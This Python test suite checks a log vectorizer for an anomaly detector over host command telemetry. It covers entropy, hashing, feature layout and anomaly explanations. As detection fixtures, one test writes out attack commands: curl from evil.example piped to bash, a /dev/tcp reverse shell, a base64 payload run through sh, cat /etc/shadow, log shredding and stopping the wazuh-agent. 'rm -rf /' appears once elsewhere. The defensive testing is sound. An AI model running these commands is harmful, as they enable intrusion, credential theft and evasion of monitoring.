"""Tests for the feature vectorizer (schema v2)."""

import numpy as np

from src.features import (
    CATEGORICAL_FIELDS,
    CONTINUOUS_FEATURES,
    FEATURE_SCHEMA_VERSION,
    HASH_SIZE,
    INDICATOR_FLAGS,
    INDICATOR_WEIGHT,
    INPUT_DIM,
    LogVectorizer,
    explain_anomaly,
    feature_layout,
    has_process_telemetry,
    standardize,
    read_agent_id,
    read_process_name,
)

# Vector offsets implied by the layout, kept explicit so a silent reordering
# fails the suite rather than the model.
SCALAR_COUNT = len(CONTINUOUS_FEATURES) + len(INDICATOR_FLAGS)
FLAGS_START = len(CONTINUOUS_FEATURES)
CATEGORICAL_START = SCALAR_COUNT


def _flag_index(name: str) -> int:
    return FLAGS_START + INDICATOR_FLAGS.index(name)


def _vector_for(command: str, **data: object) -> np.ndarray:
    event = {"agent": {"id": "017"}, "data": {"command": command, **data}}
    return LogVectorizer().extract_vector(event)


def test_entropy_zero_for_uniform_string() -> None:
    assert LogVectorizer().calculate_shannon_entropy("aaaa") == 0.0


def test_entropy_one_bit_for_two_equal_symbols() -> None:
    assert LogVectorizer().calculate_shannon_entropy("ab") == 1.0


def test_entropy_empty_string() -> None:
    assert LogVectorizer().calculate_shannon_entropy("") == 0.0


def test_hashing_is_fixed_size_and_deterministic() -> None:
    vectorizer = LogVectorizer()
    first = vectorizer.apply_feature_hashing("process_name", "bash")
    second = vectorizer.apply_feature_hashing("process_name", "bash")
    assert len(first) == HASH_SIZE
    assert first == second  # Deterministic across calls.
    # Exactly one bucket is set, to +1 or -1.
    nonzero = [value for value in first if value != 0.0]
    assert len(nonzero) == 1
    assert nonzero[0] in (1.0, -1.0)


def test_extract_vector_shape_and_dtype() -> None:
    vector = _vector_for("rm -rf /", srcuser="root")
    assert isinstance(vector, np.ndarray)
    assert vector.dtype == np.float32
    assert vector.shape == (INPUT_DIM,)


def test_extract_vector_handles_missing_data() -> None:
    vector = LogVectorizer().extract_vector({"data": {}})
    assert vector.shape == (INPUT_DIM,)
    assert vector.dtype == np.float32


def test_token_count_dimension_counts_command_tokens() -> None:
    """Dimension 2 is the token count of the command, and nothing else.

    A ``syscall_count`` field in the event must not be picked up: the dimension
    would then mean two different quantities depending on the decoder, which the
    scaler fitted at training time cannot represent.
    """
    command = "/usr/bin/docker ps -a --format table"
    vector = _vector_for(command, syscall_count=4096)
    assert vector[2] == float(len(command.split()))


def test_process_name_is_derived_from_the_command() -> None:
    """The sudo decoder carries no process field, so argv[0] supplies the name."""
    assert read_process_name({"command": "/usr/bin/docker exec jenkins sh"}) == "docker"
    assert read_process_name({"command": "'/usr/bin/find' /opt"}) == "find"
    assert read_process_name({"command": ""}) == "unknown"
    # An explicit field still wins, reduced to its basename.
    assert read_process_name({"command": "/usr/bin/docker ps", "exe": "/bin/bash"}) == "bash"


def test_process_name_survives_unbalanced_quotes() -> None:
    """Raw log lines are not always shell-parseable; extraction must not raise."""
    assert read_process_name({"command": "/usr/bin/sh -c 'unterminated"}) == "sh"


def test_agent_id_comes_from_the_event_envelope() -> None:
    """The agent lives beside ``data``, not inside it, so hosts are separable."""
    assert read_agent_id({"agent": {"id": "001", "name": "host-01"}}) == "001"
    assert read_agent_id({"agent": {"name": "host-01"}}) == "host-01"
    assert read_agent_id({"data": {"command": "ls"}}) == ""


def test_different_agents_produce_different_vectors() -> None:
    """Schema v1 was host-blind; the same command on two hosts must now differ."""
    vectorizer = LogVectorizer()
    payload = {"data": {"command": "/usr/bin/docker ps"}}
    first = vectorizer.extract_vector({**payload, "agent": {"id": "000"}})
    second = vectorizer.extract_vector({**payload, "agent": {"id": "017"}})
    assert not np.array_equal(first, second)


def test_indicator_flags_fire_on_attack_shapes() -> None:
    """The patterns schema v1 could not see must each set their own dimension."""
    cases = {
        "pipe_to_interpreter": "curl -s http://evil.example/x.sh | bash",
        "remote_fetch": "curl -s http://evil.example/x.sh | bash",
        "raw_socket_redirect": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        "interactive_shell_spawn": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        "encoded_payload": "echo ZXZpbA== | base64 -d | sh",
        "security_tooling_disabled": "systemctl stop wazuh-agent",
        "log_tampering": "shred -u /var/log/auth.log",
        "credential_access": "cat /etc/shadow",
        "persistence_config": "crontab -l",
        "privileged_account_config": "usermod -aG sudo attacker",
        "container_escape": "docker run --rm --privileged alpine sh",
        "package_management": "apt install btop",
    }
    for flag, command in cases.items():
        assert _vector_for(command)[_flag_index(flag)] == INDICATOR_WEIGHT, flag


def test_indicator_flags_stay_clear_on_routine_administration() -> None:
    """Flags that fired on ordinary admin work would be learnt as normal."""
    benign = [
        "/usr/bin/docker exec jenkins sh -c 'ls -d /var/jenkins_home/plugins/*/ | wc -l'",
        "/usr/bin/docker ps -a --format '{{.Names}} | {{.Status}}'",
        "/usr/bin/find /opt /home -maxdepth 3 -name docker-compose.yml",
        "/usr/bin/journalctl -u docker.service --since '2026-07-23 21:13:00'",
        "/usr/bin/docker exec -u jenkins jenkins sh -c 'ssh-keyscan -t ed25519 github.com'",
    ]
    for command in benign:
        flags = _vector_for(command)[FLAGS_START:CATEGORICAL_START]
        assert not flags.any(), command


def test_time_of_day_is_cyclic_and_absent_timestamp_is_distinct() -> None:
    vectorizer = LogVectorizer()
    hour_slice = slice(
        CONTINUOUS_FEATURES.index("hour_sin"), CONTINUOUS_FEATURES.index("hour_cos") + 1
    )
    midnight = vectorizer.extract_vector(
        {"timestamp": "2026-08-01T00:00:00.000+0000", "data": {"command": "ls"}}
    )[hour_slice]
    almost_midnight = vectorizer.extract_vector(
        {"timestamp": "2026-08-01T23:59:00.000+0000", "data": {"command": "ls"}}
    )[hour_slice]
    midday = vectorizer.extract_vector(
        {"timestamp": "2026-08-01T12:00:00.000+0000", "data": {"command": "ls"}}
    )[hour_slice]
    # Adjacent hours across the day boundary stay adjacent on the circle.
    assert np.linalg.norm(midnight - almost_midnight) < np.linalg.norm(midnight - midday)
    # No timestamp is its own state, not a disguised hour.
    unknown = vectorizer.extract_vector({"data": {"command": "ls"}})[hour_slice]
    assert np.array_equal(unknown, np.zeros(2, dtype=np.float32))


def test_feature_layout_spans_scalars_then_categorical() -> None:
    layout = feature_layout()
    assert len(layout) == SCALAR_COUNT + len(CATEGORICAL_FIELDS)
    for _, start, end in layout[:SCALAR_COUNT]:
        assert end - start == 1
    for _, start, end in layout[SCALAR_COUNT:]:
        assert end - start == HASH_SIZE
    # Spans are contiguous and stop before the zero padding.
    assert layout[0][1] == 0
    assert layout[-1][2] == SCALAR_COUNT + len(CATEGORICAL_FIELDS) * HASH_SIZE
    assert layout[-1][2] <= INPUT_DIM


def test_schema_version_matches_the_declared_layout() -> None:
    """A layout change without a version bump would silently reuse old weights."""
    assert FEATURE_SCHEMA_VERSION == 2
    assert CONTINUOUS_FEATURES[:3] == (
        "command_length",
        "command_entropy",
        "command_token_count",
    )
    assert len(INDICATOR_FLAGS) == 12
    assert CATEGORICAL_FIELDS == (
        "process_name",
        "acting_user",
        "target_user",
        "agent_id",
        "working_directory",
    )


def test_explain_anomaly_ranks_top_contributors() -> None:
    per_dim = np.zeros(INPUT_DIM, dtype=np.float32)
    normalized = np.zeros(INPUT_DIM, dtype=np.float32)
    # command_entropy (index 1) dominates, observed above the benign mean.
    per_dim[1] = 9.0
    normalized[1] = 2.5
    # The acting_user hash block is a weaker contributor.
    acting_user_start = CATEGORICAL_START + CATEGORICAL_FIELDS.index("acting_user") * HASH_SIZE
    per_dim[acting_user_start] = 1.0

    top = explain_anomaly(normalized, per_dim, top_k=3)

    assert top[0]["feature"] == "command_entropy"
    assert top[0]["message"] == "command entropy above normal"
    assert top[0]["contribution_pct"] == 90.0
    assert top[1]["feature"] == "acting_user"


def test_explain_anomaly_reports_token_count_as_such() -> None:
    """The third continuous feature counts command tokens, and says so."""
    per_dim = np.zeros(INPUT_DIM, dtype=np.float32)
    normalized = np.zeros(INPUT_DIM, dtype=np.float32)
    per_dim[2] = 5.0
    normalized[2] = 1.2

    top = explain_anomaly(normalized, per_dim, top_k=1)

    assert top[0]["feature"] == "command_token_count"
    assert top[0]["message"] == "command token count above normal"


def test_explain_anomaly_names_the_indicator_that_fired() -> None:
    """A set flag must be reported as the behaviour it stands for."""
    per_dim = np.zeros(INPUT_DIM, dtype=np.float32)
    normalized = np.zeros(INPUT_DIM, dtype=np.float32)
    per_dim[_flag_index("pipe_to_interpreter")] = 7.0

    top = explain_anomaly(normalized, per_dim, top_k=1)

    assert top[0]["feature"] == "pipe_to_interpreter"
    assert top[0]["message"] == "output piped into a shell or interpreter"


def test_explain_anomaly_direction_below_normal() -> None:
    per_dim = np.zeros(INPUT_DIM, dtype=np.float32)
    normalized = np.zeros(INPUT_DIM, dtype=np.float32)
    per_dim[0] = 4.0  # command_length
    normalized[0] = -1.7  # observed below the benign mean

    top = explain_anomaly(normalized, per_dim, top_k=1)
    assert top[0]["message"] == "command length below normal"


def test_explain_anomaly_empty_when_no_error() -> None:
    zeros = np.zeros(INPUT_DIM, dtype=np.float32)
    assert explain_anomaly(zeros, zeros) == []


def test_indicator_weight_does_not_depend_on_how_rare_the_pattern_was() -> None:
    """Every set flag must weigh the same, whatever the training sample held.

    Standardizing a binary feature makes its weight 1/std, so a pattern seen
    once in the corpus would count far more than one never seen at all - and a
    never-seen pattern, whose variance is zero, would hit the divide-by-zero
    guard and end up weighing least of all. Training therefore passes these
    dimensions through untouched, which this asserts end to end.
    """
    scaler_mean = [0.0] * INPUT_DIM
    scaler_var = [1.0] * INPUT_DIM

    rare = _vector_for("systemctl stop wazuh-agent")
    never_seen = _vector_for("cat /etc/shadow")

    assert standardize(rare, scaler_mean, scaler_var)[
        _flag_index("security_tooling_disabled")
    ] == INDICATOR_WEIGHT
    assert standardize(never_seen, scaler_mean, scaler_var)[
        _flag_index("credential_access")
    ] == INDICATOR_WEIGHT


def test_process_inventory_rows_are_not_command_telemetry() -> None:
    inventory = {"process": {"name": "docker-proxy", "args": "-proto udp", "euser": "root"}}

    assert not has_process_telemetry(inventory)


def test_process_name_ignores_structured_values() -> None:
    data = {"process": {"name": "docker-proxy"}, "command": "/usr/bin/docker ps"}

    assert read_process_name(data) == "docker"
